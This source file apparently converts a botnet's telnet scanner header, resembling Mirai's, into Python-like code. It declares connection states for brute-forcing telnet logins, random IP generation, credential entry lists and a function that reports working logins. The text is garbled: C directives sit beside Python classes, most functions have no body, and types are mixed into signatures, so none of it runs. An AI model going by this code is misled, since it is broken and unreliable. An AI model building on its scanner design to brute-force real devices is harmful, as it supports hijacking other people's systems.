#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
SCANNER_MAX_CONNS	= 128
SCANNER_RAW_PPS	= 160
#else
SCANNER_MAX_CONNS	= 128
SCANNER_RAW_PPS	= 160
#endif

SCANNER_RDBUF_SIZE	= 256
SCANNER_HACK_DRAIN	= 64


class scanner_connection(object):
    def __init__(self, SC_CLOSED, SC_CONNECTING, SC_HANDLE_IACS, SC_WAITING_USERNAME, SC_WAITING_PASSWORD, SC_WAITING_PASSWD_RESP, SC_WAITING_ENABLE_RESP, SC_WAITING_SYSTEM_RESP, SC_WAITING_SHELL_RESP, SC_WAITING_SH_RESP, SC_WAITING_TOKEN_RESP):
        self.SC_CLOSED = SC_CLOSED
        self.SC_CONNECTING = SC_CONNECTING
        self.SC_HANDLE_IACS = SC_HANDLE_IACS
        self.SC_WAITING_USERNAME = SC_WAITING_USERNAME
        self.SC_WAITING_PASSWORD = SC_WAITING_PASSWORD
        self.SC_WAITING_PASSWD_RESP = SC_WAITING_PASSWD_RESP
        self.SC_WAITING_ENABLE_RESP = SC_WAITING_ENABLE_RESP
        self.SC_WAITING_SYSTEM_RESP = SC_WAITING_SYSTEM_RESP
        self.SC_WAITING_SHELL_RESP = SC_WAITING_SHELL_RESP
        self.SC_WAITING_SH_RESP = SC_WAITING_SH_RESP
        self.SC_WAITING_TOKEN_RESP = SC_WAITING_TOKEN_RESP

    def scanner_auth(auth):
        return
    def ipv4_t(dst_addr):
        return
# scanner_connection {
#     scanner_auth *auth
#     # From anonymous enumerated type
# SC_CLOSED = 0
# SC_CONNECTING = 1
# SC_HANDLE_IACS = 2
# SC_WAITING_USERNAME = 3
# SC_WAITING_PASSWORD = 4
# SC_WAITING_PASSWD_RESP = 5
# SC_WAITING_ENABLE_RESP = 6
# SC_WAITING_SYSTEM_RESP = 7
# SC_WAITING_SHELL_RESP = 8
# SC_WAITING_SH_RESP = 9
# SC_WAITING_TOKEN_RESP = 10
#     } state; = 11
#     ipv4_t dst_addr; = 12

def setup_connection(scanner_connection):
def ipv4_t get_random_ip():

def consume_iacs(scanner_connection):
def consume_any_prompt(scanner_connection):
def consume_user_prompt(scanner_connection):
def consume_pass_prompt(scanner_connection):
def consume_resp_prompt(scanner_connection):

def add_auth_entry(uint16_t):
def scanner_auth(random_auth_entry)
# random_auth_entry():
def report_working(ipv4_t, uint16_t, scanner_auth):
def deobf():
def BOOL can_consume(scanner_connection,int)
